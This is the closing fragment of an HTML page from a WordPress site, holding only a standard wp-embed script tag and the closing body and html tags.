<script type='text/javascript' src='http://moviepredators.com/wp-includes/js/wp-embed.min.js?ver=4.8.5'></script>
</body>
</html>